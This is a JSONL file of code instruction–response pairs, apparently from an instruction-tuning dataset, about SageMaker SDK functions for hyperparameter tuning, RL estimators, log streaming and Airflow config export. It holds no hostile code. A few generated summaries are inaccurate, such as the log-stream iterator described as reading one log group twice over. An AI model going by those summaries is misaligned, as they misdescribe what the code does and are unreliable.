{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconverts the self instance to the desired input request format.", "response": "def to_input_req(self):\n        \"\"\"Converts the ``self`` instance to the desired input request format.\n\n        Returns:\n            dict: Containing the \"WarmStartType\" and \"ParentHyperParameterTuningJobs\" as the first class fields.\n\n        Examples:\n            >>> warm_start_config = WarmStartConfig(warm_start_type=WarmStartTypes.TransferLearning,parents=[\"p1,p2\"])\n            >>> warm_start_config.to_input_req()\n            {\n                \"WarmStartType\":\"TransferLearning\",\n                \"ParentHyperParameterTuningJobs\": [\n                    {'HyperParameterTuningJobName': \"p1\"},\n                    {'HyperParameterTuningJobName': \"p2\"},\n                ]\n            }\n        \"\"\"\n        return {\n            WARM_START_TYPE: self.type.value,\n            PARENT_HYPERPARAMETER_TUNING_JOBS: [{HYPERPARAMETER_TUNING_JOB_NAME: parent} for parent in self.parents]\n        }"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nstarting a hyperparameter tuning job.", "response": "def fit(self, inputs=None, job_name=None, include_cls_metadata=False, **kwargs):\n        \"\"\"Start a hyperparameter tuning job.\n\n        Args:\n            inputs: Information about the training data. Please refer to the ``fit()`` method of\n                the associated estimator, as this can take any of the following forms:\n\n                * (str) - The S3 location where training data is saved.\n                * (dict[str, str] or dict[str, sagemaker.session.s3_input]) - If using multiple channels for\n                    training data, you can specify a dict mapping channel names\n                    to strings or :func:`~sagemaker.session.s3_input` objects.\n                * (sagemaker.session.s3_input) - Channel configuration for S3 data sources that can provide\n                    additional information about the training dataset. See :func:`sagemaker.session.s3_input`\n                    for full details.\n                * (sagemaker.amazon.amazon_estimator.RecordSet) - A collection of\n                    Amazon :class:~`Record` objects serialized and stored in S3.\n                    For use with an estimator for an Amazon algorithm.\n                * (list[sagemaker.amazon.amazon_estimator.RecordSet]) - A list of\n                    :class:~`sagemaker.amazon.amazon_estimator.RecordSet` objects, where each instance is\n                    a different channel of training data.\n\n            job_name (str): Tuning job name. If not specified, the tuner generates a default job name,\n                based on the training image name and current timestamp.\n            include_cls_metadata (bool): Whether or not the hyperparameter tuning job should include\n                information about the estimator class (default: False). This information is passed\n                as a hyperparameter, so if the algorithm you are using cannot handle\n                unknown hyperparameters (e.g. an Amazon SageMaker built-in algorithm that\n                does not have a custom estimator in the Python SDK), then set\n                ``include_cls_metadata`` to ``False``.\n            **kwargs: Other arguments needed for training. Please refer to the ``fit()`` method of the associated\n                estimator to see what other arguments are needed.\n        \"\"\"\n        if isinstance(inputs, list) or isinstance(inputs, RecordSet):\n            self.estimator._prepare_for_training(inputs, **kwargs)\n        else:\n            self.estimator._prepare_for_training(job_name)\n\n        self._prepare_for_training(job_name=job_name, include_cls_metadata=include_cls_metadata)\n        self.latest_tuning_job = _TuningJob.start_new(self, inputs)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef attach(cls, tuning_job_name, sagemaker_session=None, job_details=None, estimator_cls=None):\n        sagemaker_session = sagemaker_session or Session()\n\n        if job_details is None:\n            job_details = sagemaker_session.sagemaker_client \\\n                .describe_hyper_parameter_tuning_job(HyperParameterTuningJobName=tuning_job_name)\n\n        estimator_cls = cls._prepare_estimator_cls(estimator_cls, job_details['TrainingJobDefinition'])\n        estimator = cls._prepare_estimator_from_job_description(estimator_cls, job_details['TrainingJobDefinition'],\n                                                                sagemaker_session)\n        init_params = cls._prepare_init_params_from_job_description(job_details)\n\n        tuner = cls(estimator=estimator, **init_params)\n        tuner.latest_tuning_job = _TuningJob(sagemaker_session=sagemaker_session, job_name=tuning_job_name)\n\n        return tuner", "response": "Attach to an existing hyperparameter tuning job."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef deploy(self, initial_instance_count, instance_type, accelerator_type=None, endpoint_name=None, **kwargs):\n        endpoint_name = endpoint_name or self.best_training_job()\n        best_estimator = self.estimator.attach(self.best_training_job(),\n                                               sagemaker_session=self.estimator.sagemaker_session)\n        return best_estimator.deploy(initial_instance_count, instance_type,\n                                     accelerator_type=accelerator_type,\n                                     endpoint_name=endpoint_name, **kwargs)", "response": "Deploy the best trained or user specified model to an Amazon SageMaker endpoint and return a SageMakerRealTimePredictor object."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef best_training_job(self):\n        self._ensure_last_tuning_job()\n\n        tuning_job_describe_result = \\\n            self.estimator.sagemaker_session.sagemaker_client.describe_hyper_parameter_tuning_job(\n                HyperParameterTuningJobName=self.latest_tuning_job.name)\n\n        try:\n            return tuning_job_describe_result['BestTrainingJob']['TrainingJobName']\n        except KeyError:\n            raise Exception('Best training job not available for tuning job: {}'.format(self.latest_tuning_job.name))", "response": "Return name of the best training job for the latest hyperparameter tuning job."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ndeleting an Amazon SageMaker endpoint.", "response": "def delete_endpoint(self, endpoint_name=None):\n        \"\"\"Delete an Amazon SageMaker endpoint.\n\n        If an endpoint name is not specified, this defaults to looking for an endpoint that\n        shares a name with the best training job for deletion.\n\n        Args:\n            endpoint_name (str): Name of the endpoint to delete\n        \"\"\"\n        endpoint_name = endpoint_name or self.best_training_job()\n        self.sagemaker_session.delete_endpoint(endpoint_name)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef hyperparameter_ranges(self):\n        hyperparameter_ranges = dict()\n        for range_type in ParameterRange.__all_types__:\n            parameter_ranges = []\n            for parameter_name, parameter in self._hyperparameter_ranges.items():\n                if parameter is not None and parameter.__name__ == range_type:\n                    # Categorical parameters needed to be serialized as JSON for our framework containers\n                    if isinstance(parameter, CategoricalParameter) and isinstance(self.estimator, Framework):\n                        tuning_range = parameter.as_json_range(parameter_name)\n                    else:\n                        tuning_range = parameter.as_tuning_range(parameter_name)\n                    parameter_ranges.append(tuning_range)\n            hyperparameter_ranges[range_type + 'ParameterRanges'] = parameter_ranges\n        return hyperparameter_ranges", "response": "Return the hyperparameter ranges in a dictionary to be used as part of a request for creating a hyperparameter tuning job."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a new instance of a new HyperparameterTuner that will be used to create a new TransferLearningTuner instance.", "response": "def transfer_learning_tuner(self, additional_parents=None, estimator=None):\n        \"\"\"Creates a new ``HyperparameterTuner`` by copying the request fields from the provided parent to the new\n        instance of ``HyperparameterTuner``. Followed by addition of warm start configuration with the type as\n        \"TransferLearning\" and parents as the union of provided list of ``additional_parents`` and the ``self``.\n        Also, training image in the new tuner's estimator is updated with the provided ``training_image``.\n\n        Args:\n            additional_parents (set{str}): Set of additional parents along with the self to be used in warm starting\n            the transfer learning tuner.\n            estimator (sagemaker.estimator.EstimatorBase): An estimator object that has been initialized with\n                the desired configuration. There does not need to be a training job associated with this instance.\n\n        Returns:\n            sagemaker.tuner.HyperparameterTuner: ``HyperparameterTuner`` instance which can be used to launch transfer\n            learning tuning job.\n\n        Examples:\n            >>> parent_tuner = HyperparameterTuner.attach(tuning_job_name=\"parent-job-1\")\n            >>> transfer_learning_tuner = parent_tuner.transfer_learning_tuner(additional_parents={\"parent-job-2\"})\n            Later On:\n            >>> transfer_learning_tuner.fit(inputs={})\n        \"\"\"\n\n        return self._create_warm_start_tuner(additional_parents=additional_parents,\n                                             warm_start_type=WarmStartTypes.TRANSFER_LEARNING,\n                                             estimator=estimator)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef identical_dataset_and_algorithm_tuner(self, additional_parents=None):\n\n        return self._create_warm_start_tuner(additional_parents=additional_parents,\n                                             warm_start_type=WarmStartTypes.IDENTICAL_DATA_AND_ALGORITHM)", "response": "Creates a new HyperparameterTuner instance which can be used to launch an identical dataset and algorithm tuner."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _create_warm_start_tuner(self, additional_parents, warm_start_type, estimator=None):\n        all_parents = {self.latest_tuning_job.name}\n        if additional_parents:\n            all_parents = all_parents.union(additional_parents)\n\n        return HyperparameterTuner(estimator=estimator if estimator else self.estimator,\n                                   objective_metric_name=self.objective_metric_name,\n                                   hyperparameter_ranges=self._hyperparameter_ranges,\n                                   objective_type=self.objective_type,\n                                   max_jobs=self.max_jobs,\n                                   max_parallel_jobs=self.max_parallel_jobs,\n                                   warm_start_config=WarmStartConfig(warm_start_type=warm_start_type,\n                                                                     parents=all_parents))", "response": "Create a new instance of type HyperparameterTuner with the request fields copied from self along with the warm start configuration."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate a new Amazon SageMaker hyperparameter tuning job from the HyperparameterTuner.", "response": "def start_new(cls, tuner, inputs):\n        \"\"\"Create a new Amazon SageMaker hyperparameter tuning job from the HyperparameterTuner.\n\n        Args:\n            tuner (sagemaker.tuner.HyperparameterTuner): HyperparameterTuner object created by the user.\n            inputs (str): Parameters used when called :meth:`~sagemaker.estimator.EstimatorBase.fit`.\n\n        Returns:\n            sagemaker.tuner._TuningJob: Constructed object that captures all information about the started job.\n        \"\"\"\n        config = _Job._load_config(inputs, tuner.estimator)\n\n        warm_start_config_req = None\n        if tuner.warm_start_config:\n            warm_start_config_req = tuner.warm_start_config.to_input_req()\n\n        tuner_args = config.copy()\n\n        tuner_args['job_name'] = tuner._current_job_name\n        tuner_args['strategy'] = tuner.strategy\n        tuner_args['objective_type'] = tuner.objective_type\n        tuner_args['objective_metric_name'] = tuner.objective_metric_name\n        tuner_args['max_jobs'] = tuner.max_jobs\n        tuner_args['max_parallel_jobs'] = tuner.max_parallel_jobs\n        tuner_args['parameter_ranges'] = tuner.hyperparameter_ranges()\n        tuner_args['static_hyperparameters'] = tuner.static_hyperparameters\n        tuner_args['input_mode'] = tuner.estimator.input_mode\n        tuner_args['metric_definitions'] = tuner.metric_definitions\n        tuner_args['tags'] = tuner.tags\n        tuner_args['warm_start_config'] = warm_start_config_req\n        tuner_args['early_stopping_type'] = tuner.early_stopping_type\n\n        if isinstance(tuner.estimator, sagemaker.algorithm.AlgorithmEstimator):\n            tuner_args['algorithm_arn'] = tuner.estimator.algorithm_arn\n        else:\n            tuner_args['image'] = tuner.estimator.train_image()\n\n        tuner_args['enable_network_isolation'] = tuner.estimator.enable_network_isolation()\n        tuner_args['encrypt_inter_container_traffic'] = \\\n            tuner.estimator.encrypt_inter_container_traffic\n\n        tuner.estimator.sagemaker_session.tune(**tuner_args)\n\n        return cls(tuner.sagemaker_session, tuner._current_job_name)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef some(arr):\n    return functools.reduce(lambda x, y: x or (y is not None), arr, False)", "response": "Return True iff there is an element a of arr such that a is not None"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef multi_stream_iter(client, log_group, streams, positions=None):\n    positions = positions or {s: Position(timestamp=0, skip=0) for s in streams}\n    event_iters = [log_stream(client, log_group, s, positions[s].timestamp, positions[s].skip) for s in streams]\n    events = []\n    for s in event_iters:\n        if not s:\n            events.append(None)\n            continue\n        try:\n            events.append(next(s))\n        except StopIteration:\n            events.append(None)\n\n    while some(events):\n        i = argmin(events, lambda x: x['timestamp'] if x else 9999999999)\n        yield (i, events[i])\n        try:\n            events[i] = next(event_iters[i])\n        except StopIteration:\n            events[i] = None", "response": "Iterate over the available events coming from a single log group in a single log group."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef log_stream(client, log_group, stream_name, start_time=0, skip=0):\n\n    next_token = None\n\n    event_count = 1\n    while event_count > 0:\n        if next_token is not None:\n            token_arg = {'nextToken': next_token}\n        else:\n            token_arg = {}\n\n        response = client.get_log_events(logGroupName=log_group, logStreamName=stream_name, startTime=start_time,\n                                         startFromHead=True, **token_arg)\n        next_token = response['nextForwardToken']\n        events = response['events']\n        event_count = len(events)\n        if event_count > skip:\n            events = events[skip:]\n            skip = 0\n        else:\n            skip = skip - event_count\n            events = []\n        for ev in events:\n            yield ev", "response": "A generator for log items in a single stream."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef create_model(self, role=None, vpc_config_override=VPC_CONFIG_DEFAULT,\n                     entry_point=None, source_dir=None, dependencies=None):\n        \"\"\"Create a SageMaker ``RLEstimatorModel`` object that can be deployed to an Endpoint.\n\n        Args:\n            role (str): The ``ExecutionRoleArn`` IAM Role ARN for the ``Model``, which is also used\n                during transform jobs. If not specified, the role from the Estimator will be used.\n            vpc_config_override (dict[str, list[str]]): Optional override for VpcConfig\n                set on the model. Default: use subnets and security groups from this Estimator.\n\n                * 'Subnets' (list[str]): List of subnet ids.\n                * 'SecurityGroupIds' (list[str]): List of security group ids.\n\n            entry_point (str): Path (absolute or relative) to the Python source file\n                which should be executed as the entry point for MXNet hosting.\n                This should be compatible with Python 3.5 (default: self.entry_point)\n            source_dir (str): Path (absolute or relative) to a directory with any other training\n                source code dependencies aside from tne entry point file (default: self.source_dir).\n                Structure within this directory are preserved when hosting on Amazon SageMaker.\n            dependencies (list[str]): A list of paths to directories (absolute or relative) with\n                any additional libraries that will be exported to the container\n                (default: self.dependencies). The library folders will be copied to SageMaker\n                in the same folder where the entry_point is copied. If the ```source_dir``` points\n                to S3, code will be uploaded and the S3 location will be used instead.\n\n        Returns:\n            sagemaker.model.FrameworkModel: Depending on input parameters returns\n                one of the following:\n\n                * sagemaker.model.FrameworkModel - in case image_name was specified\n                    on the estimator;\n                * sagemaker.mxnet.MXNetModel - if image_name wasn't specified and\n                    MXNet was used as RL backend;\n                * sagemaker.tensorflow.serving.Model - if image_name wasn't specified and\n                    TensorFlow was used as RL backend.\n\n        \"\"\"\n        base_args = dict(model_data=self.model_data,\n                         role=role or self.role,\n                         image=self.image_name,\n                         name=self._current_job_name,\n                         container_log_level=self.container_log_level,\n                         sagemaker_session=self.sagemaker_session,\n                         vpc_config=self.get_vpc_config(vpc_config_override))\n\n        if not entry_point and (source_dir or dependencies):\n            raise AttributeError('Please provide an `entry_point`.')\n\n        entry_point = entry_point or self.entry_point\n        source_dir = source_dir or self._model_source_dir()\n        dependencies = dependencies or self.dependencies\n\n        extended_args = dict(entry_point=entry_point,\n                             source_dir=source_dir,\n                             code_location=self.code_location,\n                             dependencies=dependencies,\n                             enable_cloudwatch_metrics=self.enable_cloudwatch_metrics)\n        extended_args.update(base_args)\n\n        if self.image_name:\n            return FrameworkModel(**extended_args)\n\n        if self.toolkit == RLToolkit.RAY.value:\n            raise NotImplementedError(\n                'Automatic deployment of Ray models is not currently available.'\n                ' Train policy parameters are available in model checkpoints'\n                ' in the TrainingJob output.'\n            )\n\n        if self.framework == RLFramework.TENSORFLOW.value:\n            from sagemaker.tensorflow.serving import Model as tfsModel\n            return tfsModel(framework_version=self.framework_version, **base_args)\n        elif self.framework == RLFramework.MXNET.value:\n            return MXNetModel(framework_version=self.framework_version, py_version=PYTHON_VERSION,\n                              **extended_args)", "response": "Create a SageMaker model object that can be deployed to an Endpoint."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the URI of the Docker image to use for training.", "response": "def train_image(self):\n        \"\"\"Return the Docker image to use for training.\n\n        The :meth:`~sagemaker.estimator.EstimatorBase.fit` method, which does the model training,\n        calls this method to find the image to use for model training.\n\n        Returns:\n            str: The URI of the Docker image.\n        \"\"\"\n        if self.image_name:\n            return self.image_name\n        else:\n            return fw_utils.create_image_uri(self.sagemaker_session.boto_region_name,\n                                             self._image_framework(),\n                                             self.train_instance_type,\n                                             self._image_version(),\n                                             py_version=PYTHON_VERSION)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _prepare_init_params_from_job_description(cls, job_details, model_channel_name=None):\n        init_params = super(RLEstimator, cls)\\\n            ._prepare_init_params_from_job_description(job_details, model_channel_name)\n\n        image_name = init_params.pop('image')\n        framework, _, tag, _ = fw_utils.framework_name_from_image(image_name)\n\n        if not framework:\n            # If we were unable to parse the framework name from the image it is not one of our\n            # officially supported images, in this case just add the image to the init params.\n            init_params['image_name'] = image_name\n            return init_params\n\n        toolkit, toolkit_version = cls._toolkit_and_version_from_tag(tag)\n\n        if not cls._is_combination_supported(toolkit, toolkit_version, framework):\n            training_job_name = init_params['base_job_name']\n            raise ValueError(\n                \"Training job: {} didn't use image for requested framework\".format(\n                    training_job_name)\n            )\n\n        init_params['toolkit'] = RLToolkit(toolkit)\n        init_params['toolkit_version'] = toolkit_version\n        init_params['framework'] = RLFramework(framework)\n\n        return init_params", "response": "Convert the job description to init params that can be handled by the class constructor."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef hyperparameters(self):\n        hyperparameters = super(RLEstimator, self).hyperparameters()\n\n        additional_hyperparameters = {SAGEMAKER_OUTPUT_LOCATION: self.output_path,\n                                      # TODO: can be applied to all other estimators\n                                      SAGEMAKER_ESTIMATOR: SAGEMAKER_ESTIMATOR_VALUE}\n\n        hyperparameters.update(Framework._json_encode_hyperparameters(additional_hyperparameters))\n        return hyperparameters", "response": "Return hyperparameters used by your custom TensorFlow code during model training."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nproviding default metric definitions based on provided toolkit.", "response": "def default_metric_definitions(cls, toolkit):\n        \"\"\"Provides default metric definitions based on provided toolkit.\n\n        Args:\n            toolkit(sagemaker.rl.RLToolkit): RL Toolkit to be used for training.\n\n        Returns:\n            list: metric definitions\n        \"\"\"\n        if toolkit is RLToolkit.COACH:\n            return [\n                {'Name': 'reward-training',\n                 'Regex': '^Training>.*Total reward=(.*?),'},\n                {'Name': 'reward-testing',\n                 'Regex': '^Testing>.*Total reward=(.*?),'}\n            ]\n        elif toolkit is RLToolkit.RAY:\n            float_regex = \"[-+]?[0-9]*\\.?[0-9]+([eE][-+]?[0-9]+)?\"  # noqa: W605, E501 pylint: disable=anomalous-backslash-in-string\n            return [\n                {'Name': 'episode_reward_mean',\n                 'Regex': 'episode_reward_mean: (%s)' % float_regex},\n                {'Name': 'episode_reward_max',\n                 'Regex': 'episode_reward_max: (%s)' % float_regex}\n            ]"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nprepares the framework for the current job.", "response": "def prepare_framework(estimator, s3_operations):\n    \"\"\"Prepare S3 operations (specify where to upload `source_dir`) and environment variables\n    related to framework.\n\n    Args:\n        estimator (sagemaker.estimator.Estimator): The framework estimator to get information from and update.\n        s3_operations (dict): The dict to specify s3 operations (upload `source_dir`).\n    \"\"\"\n    if estimator.code_location is not None:\n        bucket, key = fw_utils.parse_s3_url(estimator.code_location)\n        key = os.path.join(key, estimator._current_job_name, 'source', 'sourcedir.tar.gz')\n    else:\n        bucket = estimator.sagemaker_session._default_bucket\n        key = os.path.join(estimator._current_job_name, 'source', 'sourcedir.tar.gz')\n    script = os.path.basename(estimator.entry_point)\n    if estimator.source_dir and estimator.source_dir.lower().startswith('s3://'):\n        code_dir = estimator.source_dir\n        estimator.uploaded_code = fw_utils.UploadedCode(s3_prefix=code_dir, script_name=script)\n    else:\n        code_dir = 's3://{}/{}'.format(bucket, key)\n        estimator.uploaded_code = fw_utils.UploadedCode(s3_prefix=code_dir, script_name=script)\n        s3_operations['S3Upload'] = [{\n            'Path': estimator.source_dir or script,\n            'Bucket': bucket,\n            'Key': key,\n            'Tar': True\n        }]\n    estimator._hyperparameters[sagemaker.model.DIR_PARAM_NAME] = code_dir\n    estimator._hyperparameters[sagemaker.model.SCRIPT_PARAM_NAME] = script\n    estimator._hyperparameters[sagemaker.model.CLOUDWATCH_METRICS_PARAM_NAME] = \\\n        estimator.enable_cloudwatch_metrics\n    estimator._hyperparameters[sagemaker.model.CONTAINER_LOG_LEVEL_PARAM_NAME] = estimator.container_log_level\n    estimator._hyperparameters[sagemaker.model.JOB_NAME_PARAM_NAME] = estimator._current_job_name\n    estimator._hyperparameters[sagemaker.model.SAGEMAKER_REGION_PARAM_NAME] = \\\n        estimator.sagemaker_session.boto_region_name"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef prepare_amazon_algorithm_estimator(estimator, inputs, mini_batch_size=None):\n    if isinstance(inputs, list):\n        for record in inputs:\n            if isinstance(record, amazon_estimator.RecordSet) and record.channel == 'train':\n                estimator.feature_dim = record.feature_dim\n                break\n    elif isinstance(inputs, amazon_estimator.RecordSet):\n        estimator.feature_dim = inputs.feature_dim\n    else:\n        raise TypeError('Training data must be represented in RecordSet or list of RecordSets')\n    estimator.mini_batch_size = mini_batch_size", "response": "Prepares the amazon algorithm estimator for use with Amazon algorithm."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef training_base_config(estimator, inputs=None, job_name=None, mini_batch_size=None):\n    default_bucket = estimator.sagemaker_session.default_bucket()\n    s3_operations = {}\n\n    if job_name is not None:\n        estimator._current_job_name = job_name\n    else:\n        base_name = estimator.base_job_name or utils.base_name_from_image(estimator.train_image())\n        estimator._current_job_name = utils.name_from_base(base_name)\n\n    if estimator.output_path is None:\n        estimator.output_path = 's3://{}/'.format(default_bucket)\n\n    if isinstance(estimator, sagemaker.estimator.Framework):\n        prepare_framework(estimator, s3_operations)\n\n    elif isinstance(estimator, amazon_estimator.AmazonAlgorithmEstimatorBase):\n        prepare_amazon_algorithm_estimator(estimator, inputs, mini_batch_size)\n    job_config = job._Job._load_config(inputs, estimator, expand_role=False, validate_uri=False)\n\n    train_config = {\n        'AlgorithmSpecification': {\n            'TrainingImage': estimator.train_image(),\n            'TrainingInputMode': estimator.input_mode\n        },\n        'OutputDataConfig': job_config['output_config'],\n        'StoppingCondition': job_config['stop_condition'],\n        'ResourceConfig': job_config['resource_config'],\n        'RoleArn': job_config['role'],\n    }\n\n    if job_config['input_config'] is not None:\n        train_config['InputDataConfig'] = job_config['input_config']\n\n    if job_config['vpc_config'] is not None:\n        train_config['VpcConfig'] = job_config['vpc_config']\n\n    if estimator.hyperparameters() is not None:\n        hyperparameters = {str(k): str(v) for (k, v) in estimator.hyperparameters().items()}\n\n    if hyperparameters and len(hyperparameters) > 0:\n        train_config['HyperParameters'] = hyperparameters\n\n    if s3_operations:\n        train_config['S3Operations'] = s3_operations\n\n    return train_config", "response": "Export training config from an estimator base training config."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nexport training config from an estimator.", "response": "def training_config(estimator, inputs=None, job_name=None, mini_batch_size=None):\n    \"\"\"Export Airflow training config from an estimator\n\n    Args:\n        estimator (sagemaker.estimator.EstimatorBase):\n            The estimator to export training config from. Can be a BYO estimator,\n            Framework estimator or Amazon algorithm estimator.\n        inputs: Information about the training data. Please refer to the ``fit()`` method of\n                the associated estimator, as this can take any of the following forms:\n\n            * (str) - The S3 location where training data is saved.\n            * (dict[str, str] or dict[str, sagemaker.session.s3_input]) - If using multiple channels for\n                training data, you can specify a dict mapping channel names\n                to strings or :func:`~sagemaker.session.s3_input` objects.\n            * (sagemaker.session.s3_input) - Channel configuration for S3 data sources that can provide\n                additional information about the training dataset. See :func:`sagemaker.session.s3_input`\n                for full details.\n            * (sagemaker.amazon.amazon_estimator.RecordSet) - A collection of\n                Amazon :class:~`Record` objects serialized and stored in S3.\n                For use with an estimator for an Amazon algorithm.\n            * (list[sagemaker.amazon.amazon_estimator.RecordSet]) - A list of\n                :class:~`sagemaker.amazon.amazon_estimator.RecordSet` objects, where each instance is\n                a different channel of training data.\n\n        job_name (str): Specify a training job name if needed.\n        mini_batch_size (int): Specify this argument only when estimator is a built-in estimator of an\n            Amazon algorithm. For other estimators, batch size should be specified in the estimator.\n\n    Returns:\n        dict: Training config that can be directly used by SageMakerTrainingOperator in Airflow.\n    \"\"\"\n\n    train_config = training_base_config(estimator, inputs, job_name, mini_batch_size)\n\n    train_config['TrainingJobName'] = estimator._current_job_name\n\n    if estimator.tags is not None:\n        train_config['Tags'] = estimator.tags\n\n    return train_config"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef tuning_config(tuner, inputs, job_name=None):\n    train_config = training_base_config(tuner.estimator, inputs)\n    hyperparameters = train_config.pop('HyperParameters', None)\n    s3_operations = train_config.pop('S3Operations', None)\n\n    if hyperparameters and len(hyperparameters) > 0:\n        tuner.static_hyperparameters = \\\n            {utils.to_str(k): utils.to_str(v) for (k, v) in hyperparameters.items()}\n\n    if job_name is not None:\n        tuner._current_job_name = job_name\n    else:\n        base_name = tuner.base_tuning_job_name or utils.base_name_from_image(tuner.estimator.train_image())\n        tuner._current_job_name = utils.name_from_base(base_name, tuner.TUNING_JOB_NAME_MAX_LENGTH, True)\n\n    for hyperparameter_name in tuner._hyperparameter_ranges.keys():\n        tuner.static_hyperparameters.pop(hyperparameter_name, None)\n\n    train_config['StaticHyperParameters'] = tuner.static_hyperparameters\n\n    tune_config = {\n        'HyperParameterTuningJobName': tuner._current_job_name,\n        'HyperParameterTuningJobConfig': {\n            'Strategy': tuner.strategy,\n            'HyperParameterTuningJobObjective': {\n                'Type': tuner.objective_type,\n                'MetricName': tuner.objective_metric_name,\n            },\n            'ResourceLimits': {\n                'MaxNumberOfTrainingJobs': tuner.max_jobs,\n                'MaxParallelTrainingJobs': tuner.max_parallel_jobs,\n            },\n            'ParameterRanges': tuner.hyperparameter_ranges(),\n        },\n        'TrainingJobDefinition': train_config\n    }\n\n    if tuner.metric_definitions is not None:\n        tune_config['TrainingJobDefinition']['AlgorithmSpecification']['MetricDefinitions'] = \\\n            tuner.metric_definitions\n\n    if tuner.tags is not None:\n        tune_config['Tags'] = tuner.tags\n\n    if s3_operations is not None:\n        tune_config['S3Operations'] = s3_operations\n\n    return tune_config", "response": "Export Airflow tuning config from an estimator."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef update_submit_s3_uri(estimator, job_name):\n    if estimator.uploaded_code is None:\n        return\n\n    pattern = r'(?<=/)[^/]+?(?=/source/sourcedir.tar.gz)'\n\n    # update the S3 URI with the latest training job.\n    # s3://path/old_job/source/sourcedir.tar.gz will become s3://path/new_job/source/sourcedir.tar.gz\n    submit_uri = estimator.uploaded_code.s3_prefix\n    submit_uri = re.sub(pattern, job_name, submit_uri)\n    script_name = estimator.uploaded_code.script_name\n    estimator.uploaded_code = fw_utils.UploadedCode(submit_uri, script_name)", "response": "Updates the S3 URI of the framework source directory in given estimator."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef update_estimator_from_task(estimator, task_id, task_type):\n    if task_type is None:\n        return\n    if task_type.lower() == 'training':\n        training_job = \"{{ ti.xcom_pull(task_ids='%s')['Training']['TrainingJobName'] }}\" % task_id\n        job_name = training_job\n    elif task_type.lower() == 'tuning':\n        training_job = \"{{ ti.xcom_pull(task_ids='%s')['Tuning']['BestTrainingJob']['TrainingJobName'] }}\" % task_id\n        # need to strip the double quotes in json to get the string\n        job_name = \"{{ ti.xcom_pull(task_ids='%s')['Tuning']['TrainingJobDefinition']['StaticHyperParameters']\" \\\n                   \"['sagemaker_job_name'].strip('%s') }}\" % (task_id, '\"')\n    else:\n        raise ValueError(\"task_type must be either 'training', 'tuning' or None.\")\n    estimator._current_job_name = training_job\n    if isinstance(estimator, sagemaker.estimator.Framework):\n        update_submit_s3_uri(estimator, job_name)", "response": "Update the training job of the estimator from a task in the DAG."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nprepare the framework container definition for the given framework model.", "response": "def prepare_framework_container_def(model, instance_type, s3_operations):\n    \"\"\"Prepare the framework model container information. Specify related S3 operations for Airflow to perform.\n    (Upload `source_dir`)\n\n    Args:\n        model (sagemaker.model.FrameworkModel): The framework model\n        instance_type (str): The EC2 instance type to deploy this Model to. For example, 'ml.p2.xlarge'.\n        s3_operations (dict): The dict to specify S3 operations (upload `source_dir`).\n\n    Returns:\n        dict: The container information of this framework model.\n    \"\"\"\n    deploy_image = model.image\n    if not deploy_image:\n        region_name = model.sagemaker_session.boto_session.region_name\n        deploy_image = fw_utils.create_image_uri(\n            region_name, model.__framework_name__, instance_type, model.framework_version, model.py_version)\n\n    base_name = utils.base_name_from_image(deploy_image)\n    model.name = model.name or utils.name_from_base(base_name)\n\n    bucket = model.bucket or model.sagemaker_session._default_bucket\n    script = os.path.basename(model.entry_point)\n    key = '{}/source/sourcedir.tar.gz'.format(model.name)\n\n    if model.source_dir and model.source_dir.lower().startswith('s3://'):\n        code_dir = model.source_dir\n        model.uploaded_code = fw_utils.UploadedCode(s3_prefix=code_dir, script_name=script)\n    else:\n        code_dir = 's3://{}/{}'.format(bucket, key)\n        model.uploaded_code = fw_utils.UploadedCode(s3_prefix=code_dir, script_name=script)\n        s3_operations['S3Upload'] = [{\n            'Path': model.source_dir or script,\n            'Bucket': bucket,\n            'Key': key,\n            'Tar': True\n        }]\n\n    deploy_env = dict(model.env)\n    deploy_env.update(model._framework_env_vars())\n\n    try:\n        if model.model_server_workers:\n            deploy_env[sagemaker.model.MODEL_SERVER_WORKERS_PARAM_NAME.upper()] = str(model.model_server_workers)\n    except AttributeError:\n        # This applies to a FrameworkModel which is not SageMaker Deep Learning Framework Model\n        pass\n\n    return sagemaker.container_def(deploy_image, model.model_data, deploy_env)"}
